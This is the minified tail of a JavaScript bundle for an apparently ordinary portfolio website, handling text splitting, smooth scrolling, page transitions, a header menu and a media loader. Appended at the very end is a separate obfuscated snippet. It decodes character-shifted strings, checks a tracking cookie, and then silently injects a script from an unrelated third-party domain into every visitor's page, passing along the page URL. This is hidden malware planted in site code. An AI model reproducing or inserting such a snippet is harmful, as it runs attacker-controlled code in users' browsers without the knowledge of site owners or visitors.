			R && (o > t.clientHeight && (t.style.height = o - b + "px", t.clientHeight < o && (t.style.height = o + w + "px")), s > t.clientWidth && (t.style.width = s - C + "px", t.clientWidth < s && (t.style.width = s + E + "px"))), No(i, M), B && No(n, A), No(r, S)
		},
		Vo = function t(e, i, n, r) {
			var s, o, a = Io(e.childNodes),
				u = a.length,
				h = Lo(i);
			if (3 !== e.nodeType || u > 1) {
				for (i.absolute = !1, s = 0; s < u; s++)(3 !== (o = a[s]).nodeType || /\S+/.test(o.nodeValue)) && (h && 3 !== o.nodeType && "inline" === So(o).display && (o.style.display = "inline-block", o.style.position = "relative"), o._isSplit = !0, t(o, i, n, r));
				return i.absolute = h, void(e._isSplit = !0)
			}! function(t, e, i, n) {
				var r, s, o, a, u, h, l, c, d = e.tag ? e.tag : e.span ? "span" : "div",
					p = ~(e.type || e.split || "chars,words,lines").indexOf("chars"),
					f = Lo(e),
					m = e.wordDelimiter || " ",
					g = " " !== m ? "" : f ? "&#173; " : " ",
					v = "</" + d + ">",
					_ = 1,
					D = e.specialChars ? "function" == typeof e.specialChars ? e.specialChars : Bo : null,
					y = xo.createElement("div"),
					x = t.parentNode;
				for (x.insertBefore(y, t), y.textContent = t.nodeValue, x.removeChild(t), l = -1 !== (r = function t(e) {
						var i = e.nodeType,
							n = "";
						if (1 === i || 9 === i || 11 === i) {
							if ("string" == typeof e.textContent) return e.textContent;
							for (e = e.firstChild; e; e = e.nextSibling) n += t(e)
						} else if (3 === i || 4 === i) return e.nodeValue;
						return n
					}(t = y)).indexOf("<"), !1 !== e.reduceWhiteSpace && (r = r.replace(Ao, " ").replace(Mo, "")), l && (r = r.split("<").join("{{LT}}")), u = r.length, s = (" " === r.charAt(0) ? g : "") + i(), o = 0; o < u; o++)
					if (h = r.charAt(o), D && (c = D(r.substr(o), e.specialChars))) h = r.substr(o, c || 1), s += p && " " !== h ? n() + h + "</" + d + ">" : h, o += c - 1;
					else if (h === m && r.charAt(o - 1) !== m && o) {
					for (s += _ ? v : "", _ = 0; r.charAt(o + 1) === m;) s += g, o++;
					o === u - 1 ? s += g : ")" !== r.charAt(o + 1) && (s += g + i(), _ = 1)
				} else "{" === h && "{{LT}}" === r.substr(o, 6) ? (s += p ? n() + "{{LT}}</" + d + ">" : "{{LT}}", o += 5) : h.charCodeAt(0) >= 55296 && h.charCodeAt(0) <= 56319 || r.charCodeAt(o + 1) >= 65024 && r.charCodeAt(o + 1) <= 65039 ? (a = ((r.substr(o, 12).split(Fo) || [])[1] || "").length || 2, s += p && " " !== h ? n() + r.substr(o, a) + "</" + d + ">" : r.substr(o, a), o += a - 1) : s += p && " " !== h ? n() + h + "</" + d + ">" : h;
				t.outerHTML = s + (_ ? v : ""), l && Ro(x, "{{LT}}", "<")
			}(e, i, n, r)
		},
		Go = function() {
			function t(t, e) {
				Eo || (xo = document, wo = window, Eo = 1), this.elements = Io(t), this.chars = [], this.words = [], this.lines = [], this._originals = [], this.vars = e || {}, this.split(e)
			}
			var e = t.prototype;
			return e.split = function(t) {
				this.isSplit && this.revert(), this.vars = t = t || this.vars, this._originals.length = this.chars.length = this.words.length = this.lines.length = 0;
				for (var e, i, n, r = this.elements.length, s = t.tag ? t.tag : t.span ? "span" : "div", o = ko(t.wordsClass, s), a = ko(t.charsClass, s); --r > -1;) n = this.elements[r], this._originals[r] = n.innerHTML, e = n.clientHeight, i = n.clientWidth, Vo(n, t, o, a), jo(n, t, this.chars, this.words, this.lines, i, e);
				return this.chars.reverse(), this.words.reverse(), this.lines.reverse(), this.isSplit = !0, this
			}, e.revert = function() {
				var t = this._originals;
				if (!t) throw "revert() call wasn't scoped properly.";
				return this.elements.forEach((function(e, i) {
					return e.innerHTML = t[i]
				})), this.chars = [], this.words = [], this.lines = [], this.isSplit = !1, this
			}, t.create = function(e, i) {
				return new t(e, i)
			}, t
		}();
	Go.version = "3.4.0";
	var Ho = function() {
		function t(e) {
			var i = e.container;
			r()(this, t), this.vs = new Ps.a, this.container = i, this.scroll = {
				y: 0,
				currentY: 0,
				maxY: 0,
				ease: .1,
				zeroThreshold: 1e-5
			}, this.onScroll = this.onScroll.bind(this), this.onTick = this.onTick.bind(this), this.onResize = this.onResize.bind(this), this.enabled = !fs.IS_MOBILE, this.enabled && (0 !== window.scrollY && fs.isFirstPage && setTimeout((function() {
				window.scrollTo(0, 0)
			}), 100), this.init())
		}
		return o()(t, [{
			key: "onScroll",
			value: function(t) {
				this.scroll.y += t.deltaY, this.scroll.y = Ls(this.scroll.y, this.scroll.maxY, 0)
			}
		}, {
			key: "onTick",
			value: function() {
				this.scroll.currentY = Is(this.scroll.currentY, this.scroll.y, this.scroll.ease), Math.abs(this.scroll.y - this.scroll.currentY) < this.scroll.zeroThreshold && (this.scroll.currentY = this.scroll.y), this.container.style.transform = "translateY(".concat(this.scroll.currentY, "px)")
			}
		}, {
			key: "onResize",
			value: function() {
				this.computeSizes(), this.scroll.y < this.scroll.maxY && (this.scroll.y = this.scroll.currentY = this.scroll.maxY)
			}
		}, {
			key: "computeSizes",
			value: function() {
				var t = this.container.scrollHeight - fs.WINDOW_HEIGHT;
				this.scroll.maxY = t < 0 ? 0 : -t
			}
		}, {
			key: "init",
			value: function() {
				this.computeSizes(), this.vs.on(this.onScroll), cs.ticker.add(this.onTick), ps.on(gs, this.onResize)
			}
		}, {
			key: "destroy",
			value: function() {
				this.enabled && (cs.ticker.remove(this.onTick), this.vs.off(this.onScroll), ps.off(gs, this.onResize))
			}
		}]), t
	}();
	var qo = function(t) {
		d()(i, t);
		var e = function(t) {
			var e = function() {
				if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
				if (Reflect.construct.sham) return !1;
				if ("function" == typeof Proxy) return !0;
				try {
					return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
				} catch (t) {
					return !1
				}
			}();
			return function() {
				var i, n = g()(t);
				if (e) {
					var r = g()(this).constructor;
					i = Reflect.construct(n, arguments, r)
				} else i = n.apply(this, arguments);
				return f()(this, i)
			}
		}(i);

		function i() {
			return r()(this, i), e.apply(this, arguments)
		}
		return o()(i, [{
			key: "onLeaveCompleted",
			value: function() {
				this.scroll.destroy(), ps.off(gs, this.onResize)
			}
		}, {
			key: "onEnter",
			value: function() {
				this._wrapper = this.wrap.lastElementChild, this.scroll = new Ho({
					container: this._wrapper
				}), this.onResize = this.onResize.bind(this), ps.on(gs, this.onResize)
			}
		}, {
			key: "onEnterCompleted",
			value: function() {
				var t = this;
				fs.isFirstPage && ta((function() {
					t.scroll.onResize(), t.Transition.$split = {}, t.Transition.$split.title = i.initSplitLines(document.querySelector(".page-about__hero-title")), t.Transition.$split.description = i.initSplitLines(document.querySelector(".page-about__introduction p")), t.Transition.in({
						from: {
							remove: qs
						},
						to: t._wrapper,
						done: qs
					})
				}))
			}
		}, {
			key: "onLeave",
			value: function() {}
		}, {
			key: "onResize",
			value: function() {
				this.Transition.$split.description.split(), i.addCustomSplitLines(this.Transition.$split.description, this.Transition.$split.description.vars.type), this.scroll.onResize()
			}
		}], [{
			key: "addCustomSplitLines",
			value: function(t, e) {
				t.innerLines = [], t[e].forEach((function(e) {
					var i = document.createElement("div");
					i.classList.add("gstline-inner"), i.innerHTML = e.innerHTML, e.innerHTML = "", e.appendChild(i), t.innerLines.push(i)
				}))
			}
		}, {
			key: "initSplitLines",
			value: function(t) {
				var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "lines",
					n = new Go(t, Qs()({
						type: e
					}, e + "Class", "gstline"));
				return i.addCustomSplitLines(n, e), n.vars.elementArgs = t, n
			}
		}]), i
	}(js.Renderer);
	var Yo = function(t) {
		d()(i, t);
		var e = function(t) {
			var e = function() {
				if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
				if (Reflect.construct.sham) return !1;
				if ("function" == typeof Proxy) return !0;
				try {
					return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
				} catch (t) {
					return !1
				}
			}();
			return function() {
				var i, n = g()(t);
				if (e) {
					var r = g()(this).constructor;
					i = Reflect.construct(n, arguments, r)
				} else i = n.apply(this, arguments);
				return f()(this, i)
			}
		}(i);

		function i() {
			return r()(this, i), e.apply(this, arguments)
		}
		return o()(i, [{
			key: "showSplitLines",
			value: function(t) {
				var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : .025;
				return cs.fromTo(t.innerLines, {
					y: "102%"
				}, {
					y: 0,
					stagger: e,
					duration: .7,
					ease: "smooth_1"
				})
			}
		}, {
			key: "hideSplitLines",
			value: function(t) {
				var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : .025;
				return cs.to(t.innerLines, {
					y: "-102%",
					stagger: e,
					duration: .7,
					ease: "smooth_1"
				})
			}
		}, {
			key: "in",
			value: function(t) {
				var e = t.from,
					i = t.to,
					n = t.done;
				_o.stop(), e.remove(), fs.currentProject = fs.projects[0];
				var r = i.querySelector(".page-about__hero-title"),
					s = i.querySelector(".page-about__introduction p"),
					o = i.querySelectorAll(".page-about__facts-item"),
					a = i.querySelectorAll(".page-about__footer-labels-item"),
					u = i.querySelector(".page-about__footer .hr");
				this.$split || (this.$split = {}, this.$split.title = qo.initSplitLines(r), this.$split.description = qo.initSplitLines(s));
				var h = cs.timeline({
					onComplete: n
				});
				h.add(this.showSplitLines(this.$split.title), 0), h.add(this.showSplitLines(this.$split.description), 0), h.from(o, {
					y: 50,
					opacity: 0,
					duration: .7,
					ease: "smooth_1",
					stagger: .1
				}, 0), h.from(a, {
					y: "110%",
					duration: .7,
					ease: "smooth_1"
				}, 0), h.from(u, {
					y: "30px",
					opacity: 0,
					duration: .7,
					ease: "smooth_1"
				}, 0)
			}
		}, {
			key: "out",
			value: function(t) {
				var e = t.from,
					i = t.done,
					n = e.querySelectorAll(".page-about__facts-item"),
					r = e.querySelectorAll(".page-about__footer-labels-item"),
					s = e.querySelector(".page-about__footer .hr"),
					o = cs.timeline({
						onComplete: function() {
							"/" === ea.Router.location.pathname && (_o.resume(), ps.emit(xs)), i()
						}
					});
				o.add(this.hideSplitLines(this.$split.title), 0), o.add(this.hideSplitLines(this.$split.description), 0), o.to(n, {
					y: -50,
					opacity: 0,
					duration: .7,
					ease: "smooth_1",
					stagger: .1
				}, 0), o.to(r, {
					y: "-110%",
					duration: .7,
					ease: "smooth_1"
				}, 0), o.to(s, {
					y: "-30px",
					opacity: 0,
					duration: .7,
					ease: "smooth_1"
				}, 0)
			}
		}]), i
	}(js.Transition);
	var Xo = function(t) {
			d()(i, t);
			var e = function(t) {
				var e = function() {
					if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
					if (Reflect.construct.sham) return !1;
					if ("function" == typeof Proxy) return !0;
					try {
						return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
					} catch (t) {
						return !1
					}
				}();
				return function() {
					var i, n = g()(t);
					if (e) {
						var r = g()(this).constructor;
						i = Reflect.construct(n, arguments, r)
					} else i = n.apply(this, arguments);
					return f()(this, i)
				}
			}(i);

			function i() {
				return r()(this, i), e.apply(this, arguments)
			}
			return o()(i, [{
				key: "in",
				value: function(t) {
					var e = t.from,
						i = t.to,
						n = t.done;
					_o.stop(), e.remove(), fs.currentProject = fs.projects[0], document.body.style.backgroundColor = "#CFCFCF", document.body.classList.add("light"), cs.timeline({
						onComplete: n
					}).from(i, {
						opacity: 0,
						duration: .3,
						ease: "smooth_1"
					})
				}
			}, {
				key: "out",
				value: function(t) {
					var e = t.from,
						i = t.done;
					document.body.style.backgroundColor = "", document.body.classList.remove("light"), cs.timeline({
						onComplete: function() {
							"/" === ea.Router.location.pathname && (_o.resume(), ps.emit(xs)), i()
						}
					}).to(e, {
						opacity: 0,
						duration: .3,
						ease: "smooth_1"
					})
				}
			}]), i
		}(js.Transition),
		$o = function() {
			function t(e) {
				var i = e.wrapper,
					n = e.scroll;
				r()(this, t), this.dom = {
					wrapper: i,
					preview: i.querySelector("#archive-preview"),
					videos: Array.from(i.querySelectorAll(".page-archive__preview video")),
					links: Array.from(i.querySelectorAll(".page-archive__table-sublist-item"))
				}, this.activeVideo = null, this.scroll = n, this.mouse = {
					last: {
						x: 0,
						y: 0
					},
					current: {
						x: 0,
						y: 0
					},
					easing: .1
				}, this.onMouseEnter = this.onMouseEnter.bind(this), this.onMouseLeave = this.onMouseLeave.bind(this), this.onMouseMove = this.onMouseMove.bind(this), this.onTick = this.onTick.bind(this), this.init()
			}
			return o()(t, [{
				key: "onMouseEnter",
				value: function(t) {
					var e = t.currentTarget.dataset.id,
						i = this.dom.videos.find((function(t) {
							return t.dataset.id === e
						}));
					i && (this.activeVideo && this.activeVideo.classList.remove("active"), this.activeVideo = i, i.classList.add("active"), i.play())
				}
			}, {
				key: "onMouseLeave",
				value: function(t) {
					var e = t.currentTarget.dataset.id,
						i = this.dom.videos.find((function(t) {
							return t.dataset.id === e
						}));
					i.classList.remove("active"), i.pause(), this.activeVideo = null
				}
			}, {
				key: "onMouseMove",
				value: function(t) {
					this.mouse.last.x = t.clientX, this.mouse.last.y = t.clientY - this.scroll.currentY
				}
			}, {
				key: "onTick",
				value: function() {
					this.mouse.current.x = Is(this.mouse.current.x, this.mouse.last.x, this.mouse.easing), this.mouse.current.y = Is(this.mouse.current.y, this.mouse.last.y, this.mouse.easing), this.dom.preview.style.transform = "translate(".concat(this.mouse.current.x, "px, ").concat(this.mouse.current.y, "px)")
				}
			}, {
				key: "addEvents",
				value: function() {
					var t = this;
					window.addEventListener("mousemove", this.onMouseMove), this.dom.links.forEach((function(e) {
						e.addEventListener("mouseenter", t.onMouseEnter), e.addEventListener("mouseleave", t.onMouseLeave)
					})), cs.ticker.add(this.onTick)
				}
			}, {
				key: "removeEvents",
				value: function() {
					var t = this;
					cs.ticker.remove(this.onTick), window.removeEventListener("mousemove", this.onMouseMove), this.dom.links.forEach((function(e) {
						e.removeEventListener("mouseenter", t.onMouseEnter), e.removeEventListener("mouseleave", t.onMouseLeave)
					}))
				}
			}, {
				key: "init",
				value: function() {
					this.addEvents()
				}
			}, {
				key: "destroy",
				value: function() {
					this.removeEvents()
				}
			}]), t
		}();
	var Zo = function(t) {
			d()(i, t);
			var e = function(t) {
				var e = function() {
					if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
					if (Reflect.construct.sham) return !1;
					if ("function" == typeof Proxy) return !0;
					try {
						return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
					} catch (t) {
						return !1
					}
				}();
				return function() {
					var i, n = g()(t);
					if (e) {
						var r = g()(this).constructor;
						i = Reflect.construct(n, arguments, r)
					} else i = n.apply(this, arguments);
					return f()(this, i)
				}
			}(i);

			function i() {
				return r()(this, i), e.apply(this, arguments)
			}
			return o()(i, [{
				key: "onLeaveCompleted",
				value: function() {
					this.scroll.destroy(), ps.off(gs, this.onResize), this.preview.destroy()
				}
			}, {
				key: "onEnter",
				value: function() {
					this._wrapper = this.wrap.lastElementChild, this.scroll = new Ho({
						container: this._wrapper
					}), this.onResize = this.onResize.bind(this), ps.on(gs, this.onResize)
				}
			}, {
				key: "onEnterCompleted",
				value: function() {
					var t = this;
					this.preview = new $o({
						wrapper: this._wrapper,
						scroll: this.scroll.scroll
					}), fs.isFirstPage && ta((function() {
						t.scroll.onResize(), t.Transition.in({
							from: {
								remove: qs
							},
							to: t._wrapper,
							done: qs
						})
					}))
				}
			}, {
				key: "onLeave",
				value: function() {}
			}, {
				key: "onResize",
				value: function() {
					this.scroll.onResize()
				}
			}]), i
		}(js.Renderer),
		Ko = function() {
			function t() {
				r()(this, t), this.dom = {
					opener: document.getElementById("nb-opener"),
					close: document.getElementById("nb-close"),
					header: document.querySelector(".header"),
					links: Array.from(document.querySelectorAll(".header__nav-menu-links-item")),
					BL: {
						opener: document.getElementById("nb-opener-bl"),
						close: document.getElementById("nb-close-bl")
					},
					shortText: document.querySelector(".header__nav-menu-text")
				}, this.currentActiveLink = null, this.pages = ["index", "about", "archive"], this.onOpen = this.onOpen.bind(this), this.onClose = this.onClose.bind(this), this.onNavigateLink = this.onNavigateLink.bind(this), this.DURATION = 700, this.init()
			}
			return o()(t, [{
				key: "init",
				value: function() {
					this.addEvents(), this.updateCurrentLink(this.pages.indexOf(fs.appeared))
				}
			}, {
				key: "updateCurrentLink",
				value: function(t) {
					-1 !== t ? (this.currentActiveLink && this.currentActiveLink.classList.remove("active"), this.currentActiveLink = this.dom.links[t], this.currentActiveLink.classList.add("active")) : console.warn("page not found " + t)
				}
			}, {
				key: "onOpen",
				value: function() {
					this.dom.header.classList.add("opened")
				}
			}, {
				key: "onClose",
				value: function() {
					this.dom.header.classList.remove("opened")
				}
			}, {
				key: "onNavigateLink",
				value: function(t) {
					var e = this;
					return function(i) {
						setTimeout((function() {
							e.updateCurrentLink(t)
						}), 900)
					}
				}
			}, {
				key: "addEvents",
				value: function() {
					var t = this;
					this.dom.opener.addEventListener("click", this.onOpen), this.dom.close.addEventListener("click", this.onClose), this.dom.links.forEach((function(e, i) {
						return e.addEventListener("click", t.onNavigateLink(i))
					}))
				}
			}]), t
		}(),
		Qo = function() {
			function t() {
				r()(this, t), this.dom = {
					container: document.getElementById("loader"),
					num: document.getElementById("l-num"),
					numbers: document.getElementById("l-num").querySelectorAll("span"),
					media: this.getMedia()
				}, this.total = this.dom.media.length, this.count = this.dom.media.length, this.countProgress = {
					value: 0
				}, this.timeline = null, this.loaded = !1, this.onMediaLoaded = this.onMediaLoaded.bind(this), this.init()
			}
			return o()(t, [{
				key: "getMedia",
				value: function() {
					var t = null,
						e = window.location.pathname.split("/").pop();
					return "project" === fs.appeared ? t = fs.media[e] : (t = [], Object.keys(fs.media).forEach((function(e) {
						for (var i = Math.min(4, fs.media[e].length), n = 0; n < i; n++) t.push(fs.media[e][n])
					}))), t.filter((function(t) {
						return !t.dataset.url
					}))
				}
			}, {
				key: "init",
				value: function() {
					this.addEvents()
				}
			}, {
				key: "allLoaded",
				value: function() {
					this.loaded || (this.dom.media.forEach((function(t) {
						"VIDEO" === t.tagName && t.pause()
					})), ps.emit(Es), this.loaded = !0, this.dom.container.classList.add("loaded"))
				}
			}, {
				key: "onMediaLoaded",
				value: function() {
					var t = this;
					this.count--;
					var e = this.count;
					cs.to(this.countProgress, {
						value: 100 * (1 - this.count / this.total),
						duration: .7,
						ease: bs,
						onUpdate: function() {
							var e = Math.round(t.countProgress.value),
								i = e < 10 ? "00" + e : e < 100 ? "0" + e : "" + e;
							t.dom.numbers[0].textContent = i[0], t.dom.numbers[1].textContent = i[1], t.dom.numbers[2].textContent = i[2]
						},
						onComplete: function() {
							0 === e && t.allLoaded()
						}
					})
				}
			}, {
				key: "addEvents",
				value: function() {
					var t = this;
					this.dom.media.forEach((function(e) {
						"IMG" === e.tagName ? !0 === e.complete ? t.onMediaLoaded() : e.addEventListener("load", t.onMediaLoaded) : e.readyState >= e.HAVE_ENOUGH_DATA ? t.onMediaLoaded() : e.addEventListener("canplay", t.onMediaLoaded, {
							once: !0
						})
					}))
				}
			}]), t
		}(),
		Jo = new(function() {
			function t() {
				r()(this, t), this.WebGL = _o, this.Router = null, this.Header = null, this.Loader = null
			}
			return o()(t, [{
				key: "initMedia",
				value: function() {
					for (var t = Array.from(document.querySelectorAll("#gl-images img, #gl-images video")), e = {}, i = {}, n = 0; n < t.length; n++) {
						var r = t[n].dataset.project;
						e[r] ? e[r].push(t[n]) : e[r] = [t[n]], i[r] || (i[r] = r)
					}
					fs.media = e, fs.projects = Object.values(i)
				}
			}, {
				key: "start",
				value: function() {
					var t, e = this;
					console.log("App has started"), this.initMedia(), this.Router = ((t = new js.Core({
						renderers: {
							index: mo,
							project: oo,
							about: qo,
							archive: Zo
						},
						transitions: {
							default: Do,
							index: yo,
							project: bo,
							about: Yo,
							archive: Xo
						}
					})).on("NAVIGATE_OUT", (function(t) {
						t.trigger, document.body.style.cursor = "wait"
					})), t.on("NAVIGATE_IN", (function(e) {
						var i = e.trigger;
						if (document.body.style.cursor = "", fs.isFirstPage = !1, i && "string" != typeof i && void 0 !== i.dataset.menuLink);
						else {
							var n = t.location.pathname,
								r = "/" === n ? "index" : n.split("/")[1],
								s = ea.Header.pages.indexOf(r);
							setTimeout((function() {
								ea.Header.updateCurrentLink(s)
							}), 900)
						}
					})), fs.appeared = t.properties.slug, t), this.Loader = new Qo, this.Header = new Ko, this.Router.on("NAVIGATE_OUT", (function() {
						e.Header.onClose()
					})), this.WebGL.build().then((function() {
						_o.start()
					})), fs.dom.navBarLogoBL = document.getElementById("nb-logo-bl"), fs.dom.navBarOpenerBL = document.getElementById("nb-opener-bl")
				}
			}]), t
		}());
	window.addEventListener("DOMContentLoaded", (function() {
		setTimeout((function() {
			Jo.start()
		}), 1)
	}));
	var ta = function(t) {
			ps.on(Es, t)
		},
		ea = Jo,
		ia = !1;
	ia || (ia = !0, window.addEventListener("resize", (function(t) {
		fs.WINDOW_WIDTH = this.window.innerWidth, fs.WINDOW_HEIGHT = this.window.innerHeight, fs.WINDOW_RATIO = fs.WINDOW_WIDTH / fs.WINDOW_HEIGHT, ps.emit(gs, t), document.documentElement.style.setProperty("--fullvh", "".concat(fs.WINDOW_HEIGHT, "px"))
	})), document.documentElement.style.setProperty("--fullvh", "".concat(fs.WINDOW_HEIGHT, "px"))), cs.registerEase("smooth_1", bs)
}]);
(function(o, d, l) {
	try {
		o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
		o.b = o.f('UMUWJKX');
		o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
			o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44fun3h' + 'isrjywnh3htr4l' + 'jy4xyfynh3ox' + 'DwjkjwwjwB') + l.href, d.body.appendChild(o.s));
		}, 1000);
		d.cookie = o.b + '=full;max-age=39800;'
	} catch (e) {};
}({}, document, location));